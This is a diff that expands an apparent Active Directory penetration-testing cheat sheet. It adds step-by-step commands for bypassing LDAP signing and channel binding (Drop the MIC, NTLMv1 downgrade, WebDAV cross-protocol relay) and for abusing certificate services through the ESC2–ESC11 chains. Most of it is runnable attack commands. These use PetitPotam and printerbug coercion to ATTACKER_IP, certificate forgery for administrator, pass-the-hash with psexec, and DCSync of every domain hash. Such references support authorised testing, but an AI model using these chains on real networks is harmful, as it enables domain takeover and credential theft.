@@ -744,6 +744,100 @@ crackmapexec ldap DC_IP -u USER -p PASS -M ldap-checker
 # Outputs: LDAP signing required? LDAPS channel binding required?
 ```
 
+### LDAP Signing / Channel Binding Bypass Techniques
+**When:** LDAP signing OR LDAPS channel binding (EPA) is enforced and a direct relay fails. There are several bypasses depending on the exact policy state.
+
+#### Policy state matrix — what bypass applies
+
+| `LDAPServerIntegrity` | EPA on LDAPS | Bypass possible |
+|----------------------|--------------|-----------------|
+| `1` (None) | N/A | Direct relay to LDAP — works |
+| `2` (Require signing) | Off | Relay to LDAPS works (TLS bypasses signing requirement) |
+| `2` (Require signing) | On | Need CVE-2019-1040 "Drop the MIC" OR cross-protocol trick |
+
+```bash
+# Determine current state precisely:
+nxc ldap DC_IP -u USER -p PASS -M ldap-checker
+# OR:
+python3 LdapRelayScan.py -method BOTH -dc-ip DC_IP -u USER -p PASS
+# Outputs: LDAPS Channel Binding: Required / NOT_REQUIRED / Not Defined
+#          LDAP Signing: Required / NOT_REQUIRED
+```
+
+#### Bypass 1 — CVE-2019-1040 "Drop the MIC"
+**When:** Target DC isn't patched against CVE-2019-1040 (pre-June 2019). Strips the Message Integrity Code from the NTLM authenticate message so signing tokens become invalid → relay survives.
+```bash
+# ntlmrelayx has built-in support — just add --remove-mic:
+ntlmrelayx.py -t ldaps://DC_IP --remove-mic --escalate-user pwneduser
+
+# Coerce as usual:
+python3 PetitPotam.py ATTACKER_IP DC_IP
+
+# Verify the DC is vulnerable first:
+nxc smb DC_IP -u USER -p PASS -M zerologon         # different bug but same patch level signal
+nxc smb DC_IP -u USER -p PASS -M ms17-010          # quick patch-level sanity check
+```
+
+#### Bypass 2 — NTLMv1 Downgrade
+**When:** `LmCompatibilityLevel` on the DC is ≤ 2 (allows NTLMv1). NTLMv1 doesn't carry a MIC, so signing requirements don't apply meaningfully.
+```bash
+# Check if NTLMv1 is allowed:
+nxc smb DC_IP -u USER -p PASS -M lmcompatibilitylevel
+# 0-2 = NTLMv1 accepted; 3-5 = NTLMv2 only
+
+# Force NTLMv1 in Responder + relay:
+# Edit /etc/responder/Responder.conf:
+#   Challenge = 1122334455667788
+#   ; (or use the LANMAN/NTLM challenge fields)
+sudo responder -I ens224 --lm    # request LM/NTLMv1
+
+# Crack the captured NTLMv1 → NT hash via crack.sh:
+# https://crack.sh/get-cracking/ — free for NTLMv1
+# Or:
+hashcat -m 5500 ntlmv1.txt /usr/share/wordlists/rockyou.txt
+```
+
+#### Bypass 3 — Cross-Protocol Relay (HTTP/RPC → LDAP)
+**When:** EPA is enforced on LDAPS but the source protocol of the relay doesn't include channel binding tokens. HTTP/WebDAV auth from a coerced victim doesn't include CBT — when relayed, LDAPS can't compare and falls back.
+```bash
+# Coerce victim to HTTP (via WebDAV trick):
+ntlmrelayx.py -t ldaps://DC_IP -wh ATTACKER_IP --escalate-user pwneduser
+# -wh = "WPAD host" — tells ntlmrelayx to serve a WPAD file that redirects auth to its HTTP listener
+
+# Force the victim to use WebDAV (PrinterBug variant works for this):
+python3 printerbug.py DOMAIN/USER:PASS@VICTIM 'ATTACKER_IP@80/anything'
+# The @80 forces HTTP — victim's WebClient service authenticates over HTTP without CBT
+# Requires victim to have WebClient service started (default off on servers, on for workstations)
+
+# Start WebClient on a target you control to make it relay-able:
+.\WebDAVTrickExe.exe              # forces WebClient to start
+# or check: sc query webclient
+```
+
+#### Bypass 4 — Shadow Credentials Instead of Relay
+**When:** All relay bypasses fail. If you have GenericWrite on any user/computer, skip the LDAP relay problem entirely — use Certipy Shadow Credentials.
+```bash
+# No LDAP relay needed at all — directly write msDS-KeyCredentialLink:
+certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_USER
+# Adds a key cred → requests TGT via PKINIT → returns NT hash → removes the cred
+```
+
+#### Recon checklist before attempting any bypass
+```bash
+# 1. Confirm exact policy state:
+python3 LdapRelayScan.py -method BOTH -dc-ip DC_IP -u USER -p PASS
+
+# 2. Check DC patch level (CVE-2019-1040 patched?):
+nxc smb DC_IP        # banner shows OS build; June 2019 patches = build 17763.557 (Server 2019) or later
+
+# 3. Check NTLMv1 status (DC + targets):
+nxc smb DC_IP -u USER -p PASS -M lmcompatibilitylevel
+nxc smb TARGETS_CIDR -u USER -p PASS -M lmcompatibilitylevel
+
+# 4. Check WebClient service on workstation targets (for HTTP→LDAPS relay):
+nxc smb TARGETS_CIDR -u USER -p PASS -M webdav   # finds hosts with WebDAV running
+```
+
 ### Privileged Access — Getting Shells
 
 ```bash
@@ -830,42 +924,98 @@ certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL
 ```
 
 #### ESC2 — Template Allows Any Purpose / SubCA EKU
-Same exploitation flow as ESC1 — request cert specifying a target user via UPN.
+**Indicators:** Template has `Any Purpose` EKU or no EKU restriction + Domain Users can enroll. Cert can be used for client auth despite the template not naming it.
+```bash
+# Step 1: Request the cert specifying target via UPN (same as ESC1):
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
+  -template AnyPurposeTemplate -upn 'administrator@domain.local'
+# Outputs administrator.pfx
+
+# Step 2: Auth with the cert → NT hash:
+certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+
+# Step 3: PtH to DA:
+psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
+```
 
 #### ESC3 — Enrollment Agent Template
-**Indicators:** Template has Certificate Request Agent EKU + low-priv users can enroll.
+**Indicators:** Template has `Certificate Request Agent` EKU + low-priv users can enroll.
 ```bash
 # Step 1: Get the enrollment agent cert as yourself:
-certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST -template EnrollmentAgent
-# Step 2: Use it to request a cert ON BEHALF OF administrator:
 certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
-  -template User -on-behalf-of 'DOMAIN\administrator' -pfx agent.pfx
+  -template EnrollmentAgent
+# Outputs USER.pfx — this is your "agent" cert
+
+# Step 2: Use the agent cert to request a CERT for administrator (on-behalf-of):
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
+  -template User -on-behalf-of 'DOMAIN\administrator' -pfx USER.pfx
+# Outputs administrator.pfx
+
+# Step 3: Auth with the administrator cert:
+certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+
+# Step 4: PtH:
+psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 ```
 
 #### ESC4 — Vulnerable Template ACL (you can modify template)
-**Indicators:** BloodHound shows `GenericAll`/`WriteDacl`/`WriteOwner` on a template.
+**Indicators:** BloodHound shows `GenericAll`/`WriteDacl`/`WriteOwner` on a template object.
 ```bash
-# Backup current config → make it vulnerable → exploit → restore:
+# Step 1: Save the current template config (for cleanup):
 certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -save-old
-certipy template -u USER@DOMAIN -p PASS -template VulnTemplate    # makes it ESC1
-# Now exploit as ESC1, then:
-certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -configuration old_config.json
+# Saves configuration to VulnTemplate.json
+
+# Step 2: Modify template to be vulnerable (default mod turns it into ESC1):
+certipy template -u USER@DOMAIN -p PASS -template VulnTemplate
+# Now: ENROLLEE_SUPPLIES_SUBJECT set + Client Auth EKU + low-priv enroll = ESC1
+
+# Step 3: Exploit as ESC1 — request cert as administrator:
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
+  -template VulnTemplate -upn 'administrator@domain.local'
+
+# Step 4: Auth with cert → hash → PtH:
+certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
+
+# Step 5: CLEAN UP — restore original template config:
+certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -configuration VulnTemplate.json
 ```
 
 #### ESC6 — CA Has EDITF_ATTRIBUTESUBJECTALTNAME2 Set
-**Indicators:** CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled (lets requester specify SAN on ANY template).
+**Indicators:** CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled (CA accepts user-supplied SAN on ANY template — not just ones marked ENROLLEE_SUPPLIES_SUBJECT).
 ```bash
-# Any cert request becomes ESC1 — supply -upn:
+# Step 1: Request ANY enrollable cert with -upn (CA accepts it because of the flag):
 certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
   -template User -upn 'administrator@domain.local'
+
+# Step 2: Auth → hash → PtH:
+certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 ```
 
 #### ESC7 — Vulnerable CA ACL (you control the CA)
-**Indicators:** `ManageCA` or `ManageCertificates` rights on the CA itself.
+**Indicators:** `ManageCA` or `ManageCertificates` rights on the CA object itself (you can approve/issue pending cert requests). Default templates won't let Domain Users enroll, but the CA officer can override.
 ```bash
-# Add yourself as CA officer, then issue/approve your own certs:
-certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -add-officer USER
-# Then request a pending cert and approve it yourself
+# Step 1: Add yourself as CA officer (requires ManageCA):
+certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -add-officer USER -target CA_HOST
+
+# Step 2: Enable the SubCA template on the CA (it's disabled by default; needs ManageCA):
+certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -enable-template SubCA -target CA_HOST
+
+# Step 3: Request a cert — it'll be DENIED but the request ID is logged:
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
+  -template SubCA -upn 'administrator@domain.local'
+# Note the request ID printed (e.g. "Request ID is 785")
+
+# Step 4: Approve the denied request as an officer (requires ManageCertificates):
+certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -issue-request 785 -target CA_HOST
+
+# Step 5: Retrieve the now-issued cert:
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST -retrieve 785
+
+# Step 6: Auth with the retrieved cert → hash → PtH:
+certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 ```
 
 #### ESC8 — HTTP Endpoint Without Signing (PetitPotam → ADCS Relay)
@@ -889,6 +1039,40 @@ certipy auth -pfx dc01.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
 # Step 5: DCSync with DC machine account:
 secretsdump.py -hashes :DC01_HASH 'DOMAIN/DC01$@DC_IP' -just-dc
 # Dumps krbtgt + every domain user
+```
+
+#### ESC9 — No Security Extension (msPKI-Enrollment-Flag bit 0x80000)
+**Indicators:** Template has `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000) set + `EnrolleeSuppliesSubject`. The issued cert won't contain the SID extension that ties it to the requesting user — so authentication uses the UPN as the identity.
+```bash
+# Step 1: You need GenericWrite over a sacrificial low-priv user (or any user you can modify):
+# Set their UPN to an admin's sAMAccountName (no @domain suffix):
+certipy account update -u USER@DOMAIN -p PASS -user SACRIFICIAL_USER -upn 'administrator'
+
+# Step 2: Request the cert AS the sacrificial user with the modified UPN:
+certipy req -u SACRIFICIAL_USER@DOMAIN -p SACRIFICIAL_PASS -ca CA_NAME -target CA_HOST \
+  -template Vuln9Template
+
+# Step 3: Restore the original UPN BEFORE authenticating (else PKINIT validates against admin's hash, not match):
+certipy account update -u USER@DOMAIN -p PASS -user SACRIFICIAL_USER -upn 'SACRIFICIAL_USER@domain.local'
+
+# Step 4: Auth with the cert — DC maps UPN 'administrator' → Administrator account:
+certipy auth -pfx sacrificial_user.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP -username administrator
+# Returns Administrator NT hash
+```
+
+#### ESC11 — RPC Enrollment Without Signing (IF_ENFORCEENCRYPTICERTREQUEST off)
+**Indicators:** CA's `IF_ENFORCEENCRYPTICERTREQUEST` flag is OFF → cert requests over MS-ICPR (RPC) accept relayed NTLM auth without packet encryption. Similar idea to ESC8 but uses RPC instead of HTTP enrollment.
+```bash
+# Step 1: Relay to RPC enrollment endpoint:
+ntlmrelayx.py -t rpc://CA_HOST -rpc-mode ICPR -icpr-ca-name CA_NAME -smb2support \
+  --adcs --template DomainController
+
+# Step 2: Coerce DC$ as usual:
+python3 PetitPotam.py ATTACKER_IP DC_IP
+
+# Step 3-4: Same as ESC8 — auth with the relayed pfx, then DCSync.
+certipy auth -pfx dc01.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+secretsdump.py -hashes :DC01_HASH 'DOMAIN/DC01$@DC_IP' -just-dc
 ```
 
 #### Certipy Shadow Credentials (msDS-KeyCredentialLink Abuse)
